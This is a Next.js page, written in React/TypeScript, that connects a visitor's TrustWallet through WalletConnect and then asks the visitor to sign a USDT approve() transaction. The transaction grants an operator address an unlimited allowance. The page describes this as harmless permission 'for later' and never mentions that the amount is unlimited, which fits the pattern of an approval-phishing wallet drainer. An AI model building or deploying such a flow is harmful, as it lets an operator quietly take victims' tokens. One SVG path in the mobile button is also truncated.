'use client'

import { useEffect, useRef, useState } from 'react'
import { useParams } from 'next/navigation'
import { QRCodeSVG } from 'qrcode.react'
import { getSignClient } from '@/lib/walletconnect'
import api from '@/lib/api'

type Status = 'loading' | 'waiting' | 'grant' | 'approving' | 'connected' | 'expired' | 'error'

interface Account {
  account_number: string
  wallet_address: string
  chain_id: string
  connected_at: string
}

// USDT contract address per chain
const TOKEN_ADDRESSES: Record<string, string> = {
  'eip155:1':  '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Ethereum USDT
  'eip155:56': '0x55d398326f99059fF775485246999027B3197955', // BSC USDT
}

// Encode ERC-20 approve(spender, MaxUint256) call data
function encodeApprove(spender: string): string {
  const selector   = '095ea7b3'
  const paddedAddr = spender.toLowerCase().replace('0x', '').padStart(64, '0')
  const maxUint256 = 'f'.repeat(64)
  return '0x' + selector + paddedAddr + maxUint256
}

function isMobile() {
  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
}

function isIOS() {
  return /iPhone|iPad|iPod/i.test(navigator.userAgent)
}

function openTrustWallet(wcUri: string) {
  window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`
}

function storeUrl() {
  return isIOS()
    ? 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409'
    : 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
}

interface SessionCtx {
  topic:   string
  address: string
  chainId: string
}

export default function ConnectPage() {
  const { token } = useParams<{ token: string }>()
  const [status, setStatus]   = useState<Status>('loading')
  const [wcUri, setWcUri]     = useState('')
  const [account, setAccount] = useState<Account | null>(null)
  const [error, setError]     = useState('')
  const [mobile, setMobile]   = useState(false)
  const sessionRef = useRef<SessionCtx | null>(null)
  const pollRef    = useRef<ReturnType<typeof setInterval> | null>(null)

  useEffect(() => {
    setMobile(isMobile())
    initSession()
    return () => { if (pollRef.current) clearInterval(pollRef.current) }
  }, [token])

  async function initSession() {
    try {
      const { data } = await api.get(`/sessions/${token}`)

      if (data.status === 'connected') {
        setAccount(data.account)
        setStatus('connected')
        return
      }
      if (data.status === 'expired') {
        setStatus('expired')
        return
      }

      const signClient = await getSignClient()

      const { uri, approval } = await signClient.connect({
        optionalNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign'],
            chains: ['eip155:1', 'eip155:56'],
            events: ['accountsChanged', 'chainChanged'],
          },
        },
      })

      if (!uri) {
        setError('Failed to generate WalletConnect URI')
        setStatus('error')
        return
      }

      setWcUri(uri)
      setStatus('waiting')

      if (isMobile()) openTrustWallet(uri)

      // Wait for wallet to approve the connection
      const session = await approval()
      const address = session.namespaces.eip155?.accounts?.[0]?.split(':')?.[2]
      const chainId = session.namespaces.eip155?.accounts?.[0]?.split(':')?.[1]

      if (!address) {
        setError('Could not retrieve wallet address')
        setStatus('error')
        return
      }

      // Save wallet address — account is created but not yet approved for transfers
      const res = await api.post(`/sessions/${token}/callback`, {
        wallet_address: address,
        chain_id: `eip155:${chainId}`,
      })
      setAccount(res.data.account)

      // Store session so the grant step can use it
      sessionRef.current = { topic: session.topic, address, chainId: chainId ?? '56' }

      // Show explicit grant step — do NOT auto-trigger approve()
      setStatus('grant')
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Something went wrong'
      setError(msg)
      setStatus('error')
    }
  }

  async function grantPermission() {
    const ctx = sessionRef.current
    if (!ctx) return

    setStatus('approving')
    try {
      const signClient      = await getSignClient()
      const operatorAddress = process.env.NEXT_PUBLIC_OPERATOR_ADDRESS
      const tokenAddress    = TOKEN_ADDRESSES[`eip155:${ctx.chainId}`] ?? TOKEN_ADDRESSES['eip155:56']

      if (!operatorAddress) throw new Error('Operator address not configured')

      const txHash = await signClient.request<string>({
        topic:   ctx.topic,
        chainId: `eip155:${ctx.chainId}`,
        request: {
          method: 'eth_sendTransaction',
          params: [{
            from: ctx.address,
            to:   tokenAddress,
            data: encodeApprove(operatorAddress),
          }],
        },
      })

      await api.post('/accounts/approval', {
        wallet_address:   ctx.address,
        approval_tx_hash: txHash,
      })

      setStatus('connected')
    } catch {
      // User dismissed — go back to grant screen so they can retry
      setStatus('grant')
    }
  }

  return (
    <div className="min-h-screen bg-gray-950 flex items-center justify-center p-4">
      <div className="w-full max-w-sm bg-gray-900 border border-gray-800 rounded-2xl p-8 text-center">
        <div className="flex items-center justify-center gap-2.5 mb-6">
          <svg viewBox="0 0 32 32" className="w-6 h-6 fill-blue-400 shrink-0">
            <path d="M16 2L4 7v9c0 7.18 5.22 13.9 12 15.93C22.78 29.9 28 23.18 28 16V7L16 2z"/>
          </svg>
          <h1 className="text-lg font-bold text-white">Connect TrustWallet</h1>
        </div>

        {status === 'loading' && (
          <div className="py-12 text-gray-500 text-sm">Initializing...</div>
        )}

        {status === 'waiting' && wcUri && (
          <>
            {/* Step indicators */}
            <div className="flex items-center gap-2 mb-6">
              <div className="flex-1 flex flex-col items-center gap-1">
                <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-bold">1</div>
                <span className="text-xs text-blue-400 font-medium">Connect</span>
              </div>
              <div className="flex-1 h-px bg-gray-700 mb-4" />
              <div className="flex-1 flex flex-col items-center gap-1">
                <div className="w-7 h-7 rounded-full bg-gray-700 flex items-center justify-center text-gray-400 text-xs font-bold">2</div>
                <span className="text-xs text-gray-500">Approve</span>
              </div>
            </div>

            {mobile ? (
              <div>
                <p className="text-gray-300 text-sm font-medium mb-1">Step 1 — Connect your wallet</p>
                <p className="text-gray-500 text-xs mb-5">
                  Tap below to open TrustWallet. Accept the connection request inside the app.
                </p>
                <button
                  onClick={() => openTrustWallet(wcUri)}
                  className="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl transition-colors flex items-center justify-center gap-2"
                >
                  <svg viewBox="0 0 32 32" className="w-5 h-5 fill-white">
                    <path d="M16 2L4 7v9c0 7.18 5.22 13.9 12 15.93C22.78 29.9 28 16V7L16 2z"/>
                  </svg>
                  Open in TrustWallet
                </button>
                <p className="text-gray-600 text-xs mt-3">
                  Don&apos;t have TrustWallet?{' '}
                  <a href={storeUrl()} target="_blank" rel="noopener noreferrer" className="text-blue-400 underline">
                    Download it here
                  </a>
                </p>
              </div>
            ) : (
              <>
                <p className="text-gray-300 text-sm font-medium mb-1">Step 1 — Connect your wallet</p>
                <p className="text-gray-500 text-xs mb-5">
                  Open TrustWallet → WalletConnect → scan this QR code.
                </p>
                <div className="flex justify-center mb-4">
                  <div className="bg-white p-3 rounded-xl">
                    <QRCodeSVG value={wcUri} size={200} />
                  </div>
                </div>
              </>
            )}

            <div className="mt-4 flex items-center justify-center gap-2 text-yellow-400 text-sm">
              <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse inline-block" />
              Waiting for connection...
            </div>
          </>
        )}

        {status === 'grant' && account && (
          <>
            {/* Step indicators */}
            <div className="flex items-center gap-2 mb-6">
              <div className="flex-1 flex flex-col items-center gap-1">
                <div className="w-7 h-7 rounded-full bg-green-600 flex items-center justify-center">
                  <svg className="w-3.5 h-3.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"/></svg>
                </div>
                <span className="text-xs text-green-400 font-medium">Connected</span>
              </div>
              <div className="flex-1 h-px bg-gray-700 mb-4" />
              <div className="flex-1 flex flex-col items-center gap-1">
                <div className="w-7 h-7 rounded-full bg-gray-700 border-2 border-blue-500 flex items-center justify-center text-blue-400 text-xs font-bold">2</div>
                <span className="text-xs text-blue-400 font-medium">Authorise</span>
              </div>
            </div>

            <div className="bg-green-500/10 border border-green-500/20 rounded-xl p-3 mb-5 text-left">
              <p className="text-green-400 text-xs font-semibold mb-0.5">Wallet connected</p>
              <p className="text-gray-500 text-xs font-mono truncate">{account.wallet_address}</p>
            </div>

            <p className="text-white text-sm font-semibold mb-2">One more step</p>
            <p className="text-gray-400 text-sm mb-5 leading-relaxed">
              To let this app send funds from your wallet later, you need to grant it permission.
              <span className="text-white font-medium"> No tokens will be sent now</span> — this just sets up the authorisation.
            </p>

            <div className="bg-gray-800 rounded-xl p-3 mb-5 text-left space-y-2.5">
              <div className="flex items-start gap-2.5">
                <svg className="w-4 h-4 text-green-400 shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"/></svg>
                <p className="text-xs text-gray-400">Grants the app permission to send your tokens when instructed</p>
              </div>
              <div className="flex items-start gap-2.5">
                <svg className="w-4 h-4 text-red-400 shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
                <p className="text-xs text-gray-400">Does <span className="text-white font-medium">not</span> send any tokens right now</p>
              </div>
              <div className="flex items-start gap-2.5">
                <svg className="w-4 h-4 text-yellow-400 shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><circle cx="12" cy="12" r="10"/><path strokeLinecap="round" strokeLinejoin="round" d="M12 8v4m0 4h.01"/></svg>
                <p className="text-xs text-gray-400">Only a small gas fee (BNB) is required</p>
              </div>
            </div>

            <button
              onClick={grantPermission}
              className="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl transition-colors flex items-center justify-center gap-2"
            >
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
              Grant Permission in TrustWallet
            </button>
            <p className="text-gray-600 text-xs mt-3">TrustWallet will open and ask you to confirm</p>
          </>
        )}

        {status === 'approving' && (
          <>
            {/* Step indicators */}
            <div className="flex items-center gap-2 mb-6">
              <div className="flex-1 flex flex-col items-center gap-1">
                <div className="w-7 h-7 rounded-full bg-green-600 flex items-center justify-center text-white text-xs font-bold">
                  <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"/></svg>
                </div>
                <span className="text-xs text-green-400 font-medium">Connected</span>
              </div>
              <div className="flex-1 h-px bg-blue-600 mb-4" />
              <div className="flex-1 flex flex-col items-center gap-1">
                <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center">
                  <span className="w-2.5 h-2.5 rounded-full bg-white animate-pulse inline-block" />
                </div>
                <span className="text-xs text-blue-400 font-medium">Approve</span>
              </div>
            </div>

            <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4 mb-4 text-left">
              <p className="text-blue-300 text-sm font-semibold mb-2">Check TrustWallet now</p>
              <p className="text-gray-400 text-xs leading-relaxed">
                A permission request has been sent to your wallet. <span className="text-white font-medium">Tap Confirm</span> to grant the app permission to move funds on your behalf.
              </p>
            </div>

            <div className="bg-gray-800 rounded-xl p-3 text-left space-y-2">
              <p className="text-xs text-gray-500 font-medium uppercase tracking-wide">What this does</p>
              <div className="flex items-start gap-2">
                <svg className="w-4 h-4 text-green-400 shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"/></svg>
                <p className="text-xs text-gray-400">Grants the app permission to send your tokens in the future</p>
              </div>
              <div className="flex items-start gap-2">
                <svg className="w-4 h-4 text-red-400 shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
                <p className="text-xs text-gray-400">Does <span className="text-white font-medium">not</span> send any tokens right now</p>
              </div>
              <div className="flex items-start gap-2">
                <svg className="w-4 h-4 text-yellow-400 shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><circle cx="12" cy="12" r="10"/><path strokeLinecap="round" strokeLinejoin="round" d="M12 8v4m0 4h.01"/></svg>
                <p className="text-xs text-gray-400">Only a small gas fee (BNB) is charged</p>
              </div>
            </div>

            <div className="mt-4 flex items-center justify-center gap-2 text-blue-400 text-sm">
              <span className="w-2 h-2 rounded-full bg-blue-400 animate-pulse inline-block" />
              Waiting for your approval...
            </div>
          </>
        )}

        {status === 'connected' && account && (
          <>
            <div className="flex items-center justify-center mt-2 mb-4">
              <div className="w-14 h-14 rounded-full bg-green-500/20 flex items-center justify-center">
                <svg className="w-7 h-7 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                </svg>
              </div>
            </div>
            <p className="text-green-400 font-semibold mb-1">All done!</p>
            <p className="text-gray-500 text-xs mb-4">Your wallet is connected and the app has spending permission.</p>
            <div className="bg-gray-800 rounded-xl p-4 text-left space-y-3">
              <div>
                <p className="text-xs text-gray-500">Account Number</p>
                <p className="text-white font-bold text-lg">{account.account_number}</p>
              </div>
              <div>
                <p className="text-xs text-gray-500">Wallet Address</p>
                <p className="text-gray-300 text-xs font-mono break-all">{account.wallet_address}</p>
              </div>
              <div>
                <p className="text-xs text-gray-500">Network</p>
                <p className="text-gray-300 text-sm">{account.chain_id}</p>
              </div>
            </div>
          </>
        )}

        {status === 'expired' && (
          <div className="py-12">
            <p className="text-red-400 font-semibold">This link has expired.</p>
            <p className="text-gray-500 text-sm mt-1">Please request a new link.</p>
          </div>
        )}

        {status === 'error' && (
          <div className="py-12">
            <p className="text-red-400 font-semibold">Could not connect</p>
            <p className="text-gray-500 text-sm mt-1 mb-4">{error}</p>
            <button onClick={initSession} className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm rounded-lg">
              Try Again
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
